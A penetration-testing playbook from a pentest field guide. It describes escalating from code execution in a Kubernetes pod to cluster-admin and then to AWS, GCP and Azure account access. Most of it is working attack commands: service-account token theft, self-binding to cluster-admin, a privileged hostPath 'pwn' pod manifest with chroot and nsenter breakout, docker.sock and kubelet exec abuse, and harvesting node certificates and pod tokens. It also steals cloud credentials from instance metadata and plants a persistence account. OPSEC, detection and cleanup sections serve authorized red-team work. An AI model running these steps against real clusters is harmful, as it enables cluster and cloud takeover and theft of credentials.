---
tags:
  - hack-notes
  - playbook
  - k8s
  - cloud
---

# Kubernetes Pod to Cluster to Cloud Playbook

> From RCE inside one application pod, ride the service-account token and a node breakout to full cluster control, then pivot through the node's cloud identity to the underlying AWS/GCP/Azure account.

> **Attack graph position**
> **Fed by:** Entry point (a pod or container shell).
> **Feeds into:** [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md), [GCP Service Account Impersonation to Org Admin](GCP%20Service%20Account%20Impersonation%20to%20Org%20Admin.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Turn code execution in a single pod into cluster-admin and then cloud-account access |
| Starting position | Shell/RCE inside one workload pod (exploited web app, SSRF-to-exec, deserialization, etc.) |
| End state | cluster-admin on the K8s API and IAM/role access in the cloud control plane |
| Key techniques | T1552.005 (cloud instance metadata), T1528 (steal app access token), T1610 (deploy container), T1611 (escape to host), T1613 (container/resource discovery), T1078.004 (valid cloud accounts) |
| Prerequisites | Pod mounts a usable SA token, OR a privesc/breakout path exists (permissive RBAC, exposed kubelet, mounted docker.sock, vulnerable runc) |
| Difficulty | Medium |
| Noise level | Loud (pod create, exec, secret reads, and IMDS calls are all audit-logged if logging is on) |

## Attack Path
```
[RCE in pod]
   |
   v
1. Situational awareness  ->  SA token, env, mounts, caps, /proc, IMDS reachability
   |
   v
2. Query API server with SA token  ->  kubectl auth can-i --list
   |
   +-- rights are useful ----------------------+
   |                                           |
   v                                           v
3a. Enumerate secrets / roles / RBAC      3b. SA has no rights:
   |                                          - hunt exposed kubelet 10250 (/run, /exec)
   v                                          - mounted docker.sock / containerd.sock
4. Privesc to node:                           - kernel/runc escape (Leaky Vessels
   - create privileged / hostPath /             CVE-2024-21626, runc CVE-2025-31133/
     hostPID pod -> chroot /host                 52565/52881)
   - pods/exec into a privileged pod          - capability abuse (CAP_SYS_ADMIN, hostPID)
   - abuse permissive ClusterRoleBinding             |
   |                                                 |
   +------------------- both converge ---------------+
   |
   v
5. On the node: steal kubelet client cert + every pod's projected SA token
   |
   v
6. Re-auth as node / as a high-priv SA  ->  cluster-admin
   |
   v
7. Pivot to cloud: curl IMDS from node -> node IAM role creds
   (or abuse IRSA / GKE WI / AKS workload identity token exchange)
   |
   v
[Cloud account access: STS / GCP SA / Entra]
```

## Prerequisites and Setup
- Interactive shell or reliable command execution in a target pod. A TTY helps but is not required.
- Outbound or in-cluster reachability to the API server (`$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT`, usually `kubernetes.default.svc:443`).
- Static binaries staged or downloadable: `kubectl`, `curl`, and ideally `peirates` and `kdigger` (single static Go binaries, drop and run).
- `jq` is convenient but optional; everything degrades to grep.
- Know the cloud provider early (EKS / GKE / AKS / self-managed) because the final pivot differs. Node hostname, IMDS shape, and kube-apiserver cert SANs all hint at it.
- Tooling staging from the pod, when egress is allowed:
```bash
# kubectl (match cluster version where possible)
curl -sLO https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl && chmod +x kubectl
# kdigger (context discovery from inside a pod)
curl -sLO https://github.com/quarkslab/kdigger/releases/latest/download/kdigger_linux_amd64.tar.gz
# peirates (interactive K8s privesc/lateral)
curl -sLO https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.gz
```

## Walkthrough

### Step 1. Situational awareness inside the pod
What and why: before touching the API server, fingerprint the pod. The single highest-value artifact is the projected service-account token. Mounts, capabilities, hostPID/hostNetwork, and IMDS reachability decide whether you go RBAC-first or breakout-first.

```bash
# The service-account token, CA, and namespace are at a fixed path
SA=/var/run/secrets/kubernetes.io/serviceaccount
cat $SA/token; echo
cat $SA/namespace; echo
ls -la $SA

# Environment: API server address, injected secrets, cloud hints (AWS_*, GCE_*, AZURE_*)
env | grep -iE 'KUBE|AWS|GCP|GCE|AZURE|TOKEN|SECRET|HOST'

# Mounts: look for docker.sock, containerd.sock, hostPath mounts, the host root
mount | grep -iE 'docker|containerd|crio|host|/proc|/var/run'
cat /proc/1/cgroup            # container runtime / pod UID hints
cat /proc/self/status | grep -i cap   # CapEff/CapBnd: is CAP_SYS_ADMIN set?

# hostPID? you will see host processes (PID 1 = systemd/kubelet, not your entrypoint)
ps aux | head

# Is the instance metadata service reachable from the pod? (often firewalled at pod level)
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ && echo "IMDS reachable from POD"
```
Success signal: a non-empty JWT in `$SA/token` (decode the middle segment to read `system:serviceaccount:<ns>:<name>`). `CapEff` with bit `0x...3fffffffff` or `cap_sys_admin` present means a soft breakout may already be possible.

Faster path with kdigger (runs every discovery "bucket" at once):
```bash
./kdigger dig all            # token, caps, mounts, admission, services, node-info
./kdigger dig token admission capabilities runtime   # targeted buckets
```
Decision: if `CapEff` already includes `CAP_SYS_ADMIN` and you have `hostPID`/`hostPath`, you can often break out immediately (jump to Step 4 nsenter/chroot). Otherwise continue to Step 2 and let RBAC decide.

### Step 2. Query the API server with the SA token
What and why: the SA token is a bearer credential for the Kubernetes API. Find out what it can do before doing anything noisy. `auth can-i --list` is the single most useful call in this whole chain.

```bash
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
APISERVER=https://kubernetes.default.svc

# Raw, no-kubectl proof the token authenticates (review-style self-check)
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods | head

# Preferred: drive kubectl with the token + bundled CA
export KUBECONFIG=/dev/null
KCTL="./kubectl --server=$APISERVER --certificate-authority=$SA/ca.crt --token=$TOKEN"
# (use --insecure-skip-tls-verify=true only if the CA path is missing)

# The money command: enumerate everything this SA is allowed to do, cluster-wide
$KCTL auth can-i --list
$KCTL auth can-i --list -n kube-system
$KCTL auth can-i create pods
$KCTL auth can-i '*' '*'           # the jackpot check
```
Success signal: `auth can-i --list` returns a table of resources/verbs. Anything other than the default minimal set (`selfsubjectreviews`, `tokenreviews` only) is interesting.

Decision branch:
- Token can `create pods`, has `pods/exec`, can read `secrets`, holds a `*/*` or a bind-able privileged role -> continue to Step 3.
- Token is effectively useless (only self-review verbs, no secret/pod rights) -> jump to the "No useful RBAC" branch in Step 3b.

### Step 3a. Enumerate secrets, roles, and RBAC for a privesc primitive
What and why: even a mid-priv token usually leaks a path to higher privilege: readable secrets containing other tokens/cloud keys, a role you can bind to yourself, or a workload whose SA is more powerful.

```bash
# Secrets are token and cloud-key goldmines (dockercfg, SA tokens, *_ACCESS_KEY)
$KCTL get secrets -A
$KCTL get secret <name> -n <ns> -o jsonpath='{.data.token}' | base64 -d; echo
$KCTL get secrets -A -o json | grep -iE 'AKIA|aws|password|token|BEGIN .*PRIVATE'

# Roles / bindings: find a path to a privileged SA or a self-bindable role
$KCTL get clusterrolebindings -o wide | grep -iE 'cluster-admin|edit|admin'
$KCTL get clusterroles,roles -A
# Which SAs are bound to cluster-admin? Those tokens are the target.
$KCTL get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]?'

# Pods you can exec into may run as a more privileged SA
$KCTL get pods -A -o custom-columns='NS:.metadata.namespace,POD:.metadata.name,SA:.spec.serviceAccountName,NODE:.spec.nodeName'
```
Success signal: a readable secret containing another SA token or cloud credential, OR a role/verb that lets you create pods or exec into a privileged workload.

Common privesc primitives, in rough order of preference:
- `create pods` (any namespace) -> launch a breakout pod (Step 4).
- `pods/exec` on a pod that runs as a privileged SA or mounts the host -> exec in and read its token.
- `create`/`escalate` on `(cluster)rolebindings` -> bind your SA to `cluster-admin` directly.
- `get/list secrets -A` -> harvest tokens until one is cluster-admin.

Self-bind to cluster-admin when you hold bind rights (fastest, also loudest):
```bash
$KCTL create clusterrolebinding pwn-$RANDOM \
  --clusterrole=cluster-admin \
  --serviceaccount=<ns>:<your-sa>
```

### Step 3b. No useful RBAC: hunt a node-level path
What and why: the SA is a dead end, so you stop talking to the API server and go after the node directly. Three reliable doors: an exposed kubelet, a mounted container-runtime socket, and a runtime/kernel escape.

```bash
# 1) Exposed read/write kubelet API on the node (10250). Identify the node IP first.
NODE_IP=$(cat $SA/.. 2>/dev/null; getent hosts $(hostname) | awk '{print $1}')
curl -sk https://$NODE_IP:10250/pods | head      # /pods lists every pod on the node
# /run and /exec give command execution in any pod on the node (no SA auth needed
# when --anonymous-auth=true / --authorization-mode=AlwaysAllow, still seen in the wild)
curl -sk -X POST "https://$NODE_IP:10250/run/<ns>/<pod>/<container>" -d "cmd=id"

# 2) Mounted container-runtime socket (host-level RCE in one call)
ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
# docker.sock -> launch a host-mounted privileged container
curl -s --unix-socket /var/run/docker.sock http://localhost/version
# (or with the docker CLI) docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host sh

# 3) Vulnerable runc / runtime -> container escape on container START
runc --version 2>/dev/null; ctr version 2>/dev/null
```
Decision: pick the door that exists.
- Exposed kubelet `10250` with `/run` or `/exec` -> you have command exec in privileged kube-system pods; read their tokens (Step 5) and skip straight to cluster-admin.
- `docker.sock`/`containerd.sock` mounted -> launch a `--privileged -v /:/host` container and `chroot /host` (you are root on the node; go to Step 5).
- Vulnerable runc -> use a runtime escape. Current named bugs to check the version against:
  - Leaky Vessels: **CVE-2024-21626** (runc `< 1.1.12`) - a `WORKDIR`/fd leak lets the container's process inherit a host file descriptor, giving access to the host filesystem at container start.
  - The 2025 runc trio (fixed in runc `1.2.8`, `1.3.3`, `1.4.0-rc.3`): **CVE-2025-31133** (`/dev/null` masked-path symlink swap -> attacker-controlled rw bind mount into `/proc`), **CVE-2025-52565** (`/dev/console` bind-mount race -> write to procfs), **CVE-2025-52881** (redirect `/proc` writes to attacker paths, can bypass AppArmor/SELinux). All three let a hostile image or a container you can influence at startup escape to the host. If you can get a pod scheduled (even a low-priv one) on a node whose runc is below those fixed versions, this is your breakout.

### Step 4. Break out to the node with a privileged pod
What and why: the cleanest cluster-to-node move when you hold `create pods`. A pod with `hostPID`, `privileged`, and the host root volume-mounted lets you `chroot` onto the node and `nsenter` into PID 1.

Malicious pod manifest (host filesystem mounted, privileged, host PID namespace):
```yaml
# pwn-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine:3.20            # use an image already present to avoid a pull
    securityContext:
      privileged: true
    command: ["/bin/sh","-c","sleep 1d"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /                      # the node root filesystem
      type: Directory
  nodeName: <target-node>          # optional: pin to a specific node
```
```bash
$KCTL apply -f pwn-pod.yaml
$KCTL exec -it pwn -- chroot /host /bin/bash      # you are now root on the NODE
# or, because hostPID is set, enter PID 1's namespaces directly:
$KCTL exec -it pwn -- nsenter -t 1 -m -u -i -n -p -- bash
```
Success signal: `id` returns `uid=0(root)`, `hostname` is the node not the pod, and `ls /host/etc/kubernetes` shows the node's kubelet config.

Generate the manifest fast with kdigger if you want a vetted template:
```bash
./kdigger gen -t pod --privileged --host-pid --host-path / > pwn-pod.yaml
```
Decision: if PodSecurity admission rejects the privileged pod (see Troubleshooting), drop `privileged: true` and try the `hostPath: /` mount alone (read the node filesystem and kubelet certs without full privilege), or use `pods/exec` into an already-privileged kube-system pod instead.

### Step 5. On the node: steal kubelet creds and every pod's token
What and why: root on the node means you own every credential the node and its pods hold. The kubelet client cert authenticates as `system:node:<name>` (a high-value identity), and each running pod's projected token sits under the kubelet pods directory.

```bash
# (paths are under /host if you chroot'd, or absolute if you nsenter'd into the host)
# Kubelet kubeconfig + client cert/key -> authenticate as the node identity
cat /host/etc/kubernetes/kubelet.conf
ls -la /host/var/lib/kubelet/pki/             # kubelet-client-current.pem
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem

# Every pod's projected SA token currently mounted on this node
find /host/var/lib/kubelet/pods -path '*serviceaccount/token' 2>/dev/null \
  -exec sh -c 'echo "== $1"; cat "$1"; echo' _ {} \;

# Static pod manifests sometimes hold the apiserver/admin certs on control-plane nodes
ls -la /host/etc/kubernetes/manifests /host/etc/kubernetes/pki 2>/dev/null
```
Success signal: a kubelet client cert and a pile of pod tokens. If any harvested token belongs to a cluster-admin-bound SA (check against the Step 3a binding list), you have cluster-admin.

Escalate node identity to cluster-admin: as `system:node:<name>` you can read secrets of pods scheduled to that node and, on most clusters, create a TokenRequest for those pods' SAs. Harvest a high-priv SA token, then:
```bash
$KCTL --token=<stolen-cluster-admin-sa-token> get nodes      # confirm cluster-admin
$KCTL --token=<stolen-cluster-admin-sa-token> get secrets -A
```
Peirates automates the whole token-harvest-and-pivot loop interactively:
```bash
./peirates              # menu-driven: list pods, grab SA tokens, switch identity,
                        # exec, and run the cloud-metadata modules in Step 7
# -k ignores TLS on API requests; pick a module from the menu to steal tokens / IMDS creds
```

### Step 6. Consolidate cluster-admin
What and why: lock in API control before the cloud pivot so a single token expiry does not cost you the cluster.

```bash
# Confirm the powerful identity
$KCTL --token=<admin-token> auth can-i '*' '*'        # yes -> cluster-admin

# (Optional, authorized engagements) low-noise hold: a bound SA token you control
$KCTL --token=<admin-token> -n kube-system create serviceaccount svc-metrics 2>/dev/null
$KCTL --token=<admin-token> create clusterrolebinding svc-metrics-ro \
  --clusterrole=cluster-admin --serviceaccount=kube-system:svc-metrics
```
Success signal: `auth can-i '*' '*'` returns `yes`. Stop here on the cluster axis; do not deploy destructive workloads.

### Step 7. Pivot to the cloud control plane via the node's identity
What and why: the worker node has a cloud identity. From root on the node (Step 5) the instance metadata service hands out the node role's credentials, and the cluster's workload-identity plumbing lets you mint tokens for other workloads. This is the cluster-to-cloud jump.

AWS / EKS (IMDSv2, then IRSA / Pod Identity):
```bash
# On the NODE, IMDSv2 requires a token header first
T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $T" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $T" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# -> AccessKeyId / SecretAccessKey / Token for the NODE role. Export and use:
aws sts get-caller-identity
# IRSA/Pod Identity escalation: as the node you can mint a TokenRequest for any pod's
# SA, then exchange that OIDC token for the pod's IAM role:
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::111122223333:role/<app-irsa-role> \
  --role-session-name pwn \
  --web-identity-token "$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)"
```
The node role and any IRSA/Pod-Identity role you reach are real AWS principals: enumerate from there (`aws iam get-account-authorization-details`, S3, Secrets Manager, further `assume-role`).

GCP / GKE (metadata server + Workload Identity):
```bash
# On the NODE, the GCE metadata server yields the node service-account token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
# With GKE Workload Identity, the metadata server impersonates the GSA bound to the
# pod's KSA. From a pod that is WI-bound (or after scheduling one):
gcloud auth print-access-token        # uses the impersonated GSA
# Enumerate reach, then impersonate further if allowed:
gcloud projects get-iam-policy <project>
gcloud auth print-access-token --impersonate-service-account=<target-gsa>@<project>.iam.gserviceaccount.com
```

Azure / AKS (IMDS managed identity / workload identity):
```bash
# On the NODE / from a pod with a managed identity, IMDS returns an Entra access token
curl -s -H "Metadata: true" \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# -> bearer token for ARM. Use it against the management API:
ACCESS=$(curl -s -H "Metadata: true" \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
 | jq -r .access_token)
curl -s -H "Authorization: Bearer $ACCESS" \
 "https://management.azure.com/subscriptions?api-version=2020-01-01"
# AKS workload identity (v2): the projected SA token is federated; exchange it via
# the Entra token endpoint for the federated app's identity (az login --federated-token).
```
Success signal: `aws sts get-caller-identity` / `gcloud auth print-access-token` / a valid ARM bearer token resolves to a cloud principal. You now hold cloud-account access. Enumerate blast radius and stop at the proven primitive.

Decision branch: if IMDS is blocked from the pod but not from the node, you must complete the node breakout (Steps 4-5) first. If IMDS is blocked even on the node (hop-limit 1 + IMDSv2 enforced, or `GKE_METADATA` concealment), fall back to harvesting cloud keys from K8s secrets (Step 3a), IRSA token files on disk, or CI/CD secrets reachable from the cluster.

## OPSEC and Detection
- Kubernetes audit log is the primary witness. High-signal events: `create` on `pods` with `securityContext.privileged=true`, `hostPID`, or a `hostPath` volume; `create` on `clusterrolebindings`/`rolebindings`; `pods/exec` and `pods/attach`; `get`/`list` on `secrets` cluster-wide; `tokenrequests` create. Verb plus `objectRef.resource` plus `user.username` (`system:serviceaccount:...` or `system:node:...`) pins the actor.
- `auth can-i --list` issues `SelfSubjectRulesReview` create calls. A burst of self-reviews from an application SA is a strong early indicator.
- Falco default rules catch much of this at runtime: "Launch Privileged Container", "Create HostPath Mount", "Contact K8S API Server From Container", "Read sensitive file untrusted", "Change thread namespace" (nsenter), and "Detect outbound connection to metadata service" (IMDS at 169.254.169.254). Expect alerts on the privileged pod and the chroot/nsenter.
- Cloud side: the node-role and workload-identity usage shows in CloudTrail (`AssumeRoleWithWebIdentity`, `GetCallerIdentity`, sudden API calls from an EC2 instance role), GCP Cloud Audit Logs (`GenerateAccessToken`, metadata-sourced tokens), and Entra sign-in logs (managed-identity token issuance, federated credential use). A node role suddenly calling IAM/STS/S3 it never touched is the classic tell.
- Noise reduction for an authorized op: prefer reading an existing privileged kube-system pod's token over creating a new privileged pod; reuse an image already on the node (no pull event); scope `kubectl get secrets` to the namespace you need rather than `-A`; pull IMDS once and cache the creds rather than looping.

## Cleanup
- Delete every pod and manifest you created: `$KCTL delete pod pwn -n default`; remove any DaemonSet/Job you scheduled.
- Remove any binding you added: `$KCTL delete clusterrolebinding pwn-<rand> svc-metrics-ro` and the SA `svc-metrics`.
- Delete any SA tokens/secrets you created via TokenRequest or `kubectl create secret`; revoke long-lived tokens you minted.
- Remove staged binaries and files from the pod and the node: `kubectl`, `kdigger`, `peirates`, `pwn-pod.yaml`, any harvested-token files written to `/tmp` or `/host/tmp`.
- Cloud side: delete any resources created with the stolen role (instances, keys, roles, S3 objects). Invalidate exfiltrated session credentials where possible (the node role's creds rotate on their own, but document them as exposed). Note IRSA/Pod-Identity tokens you exchanged so the client can rotate.
- Record every artifact created and credential touched for the report; do not leave persistence behind on a sanctioned engagement.

## Troubleshooting
- PodSecurity admission blocks the privileged pod (`violates PodSecurity "restricted"` / `"baseline"`). Try a different namespace whose PSA label is `privileged` or unlabeled; if blocked everywhere, drop `privileged`/`hostPID` and use a bare `hostPath: /` mount (still yields node filesystem and kubelet certs), or pivot to `pods/exec` into an already-privileged kube-system pod (kube-proxy, CNI, csi drivers).
- `auth can-i --list` returns only `selfsubjectrulesreviews`/`tokenreviews`. The SA is unprivileged: go to the Step 3b node-level branch (kubelet 10250, runtime socket, runc escape).
- `kubectl` errors `x509: certificate signed by unknown authority`. Point `--certificate-authority` at `$SA/ca.crt`; only use `--insecure-skip-tls-verify=true` if that file is absent.
- IMDS times out from the pod. Pod-level egress to `169.254.169.254` is often blocked while the node is not. Finish the node breakout, then curl IMDS from the node. On AWS, hop limit 1 + IMDSv2-required means even the node may refuse if you query from a nested context; query from the node's own namespace (`nsenter -n` into PID 1).
- IMDSv2 `401`/empty on AWS. You skipped the token PUT. Always fetch `X-aws-ec2-metadata-token` first and send it on every metadata GET.
- GKE metadata returns nothing useful from a pod. Workload Identity conceals the node SA from pods; you need the node breakout, or a pod actually bound to a GSA. AKS: legacy AAD Pod Identity needs the right pod labels (`AzurePodIdentityException`) to reach IMDS; workload identity v2 uses the projected token exchange instead.
- NetworkPolicy blocks the API server or lateral movement. Pods on the same node share the node; from node root you bypass pod NetworkPolicy entirely.
- Created pod stuck `Pending` (no schedulable node / image pull). Pin `nodeName` to a Ready node and use an image already present (`crictl images` on the node lists them).

## Variations and Pivots
- Cluster-admin reached without a node breakout (Step 3a self-bind or harvested admin token): pivot straight to cloud by `kubectl exec`-ing into a node-local privileged pod and running Step 7's IMDS calls, or by reading cloud keys from secrets.
- Exposed kubelet only (no `create pods`): the `10250 /run` and `/exec` endpoints give command exec in every pod on the node; read kube-system tokens for cluster-admin, then proceed to Step 7.
- runc/runtime escape as the sole breakout (CVE-2024-21626, CVE-2025-31133/52565/52881): if you can get any pod scheduled on a node running a pre-fix runc, the escape replaces Steps 4-5 and lands you as node root directly.
- Cloud-first targets: once you hold the node role or an IRSA/WI identity, chain into the cloud takeover playbooks. AWS -> [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md) for the IMDS-to-STS-to-account path; GCP -> [GCP Service Account Impersonation to Org Admin](GCP%20Service%20Account%20Impersonation%20to%20Org%20Admin.md) for token-to-org-admin escalation.
- Container-escape modeling and posture review when you are scoping the breakout up front: Cepheus.

## Related
- [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md)
- [Kubernetes and Container Breakout](../Cheatsheets/Kubernetes%20and%20Container%20Breakout.md)
- Cepheus
- [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md)
- [GCP Service Account Impersonation to Org Admin](GCP%20Service%20Account%20Impersonation%20to%20Org%20Admin.md)
- [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md)
- [GCP Cloud Penetration Test](../Checklists/GCP%20Cloud%20Penetration%20Test.md)
- [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
- Container

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
